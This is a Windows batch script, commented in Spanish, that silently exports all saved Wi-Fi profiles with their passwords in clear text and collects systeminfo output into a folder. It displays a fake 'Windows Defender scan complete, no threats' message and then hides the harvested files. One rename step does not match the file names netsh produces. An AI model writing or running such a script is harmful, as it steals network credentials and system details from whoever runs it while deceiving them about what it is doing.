@echo off

rem Obtener la ubicación actual del script
set "UbicacionScript=%~dp0"

rem Definir la carpeta de exportación y el nombre de archivo base
set "CarpetaExportacion=%UbicacionScript%CarpetaExportada"
set "NombreArchivoBase=PerfilesWiFi"

rem Crear la carpeta si no existe
if not exist "%CarpetaExportacion%" mkdir "%CarpetaExportacion%"

rem Obtener la fecha y hora actual para generar un nombre de archivo único
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set "datetime=%datetime:~0,8%_%datetime:~8,6%"
set "NombreArchivo=%NombreArchivoBase%_%datetime%.txt"

rem Ejecutar el comando netsh para exportar perfiles WiFi
netsh wlan export profile key=clear folder="%CarpetaExportacion%" > nul

rem Renombrar el archivo de perfiles WiFi para que coincida con el archivo de systeminfo
ren "%CarpetaExportacion%\%NombreArchivoBase%.xml" "%NombreArchivo%"

rem Comprobando Windows Defender...
echo Comprobando Windows Defender... Escaneo Completo Sin Amenazas...

rem Cambiar al directorio de la carpeta de exportación de perfiles WiFi
cd /d "%CarpetaExportacion%"

rem Ejecutar el comando systeminfo y guardar el resultado en un archivo
systeminfo > "%NombreArchivo%_systeminfo.txt" 2>&1 || (
    echo Error al ejecutar systeminfo.
    exit /b 1
)

echo Resultado de systeminfo almacenado en: "%CarpetaExportacion%\%NombreArchivo%_systeminfo.txt"

rem Hacer los archivos ocultos
attrib +h "%CarpetaExportacion%\%NombreArchivo%"
attrib +h "%CarpetaExportacion%\%NombreArchivo%_systeminfo.txt"

pause
